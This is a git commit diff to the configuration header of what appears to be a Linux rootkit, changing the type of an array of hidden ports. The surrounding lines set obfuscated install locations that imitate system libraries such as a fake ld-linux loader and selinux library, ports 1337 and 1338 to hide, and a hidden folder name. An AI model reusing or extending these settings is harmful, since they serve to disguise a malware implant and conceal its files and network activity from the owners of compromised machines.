701d6c25bd288982172851561090d78e9952f365
demon-i386 <muranotatsuo@protonmail.com>
2023-02-12 01:42:07 -0300

    Update config.h

--- utils/config.h
+++ utils/config.h
@@ -5,5 +5,5 @@ char* INSTALL_LOCATIONS[] = {
 				AY_OBFUSCATE("/lib64/ld-linux-x86-64.so.3"), 
 				AY_OBFUSCATE("/lib/selinux.so.1.1.2")
 			    };
-int* HIDDEN_PORTS[]       = {1337, 1338};
+int HIDDEN_PORTS[]       = {1337, 1338};
 char* HIDDEN_FOLDERS[]    = {AY_OBFUSCATE("jakhid")};
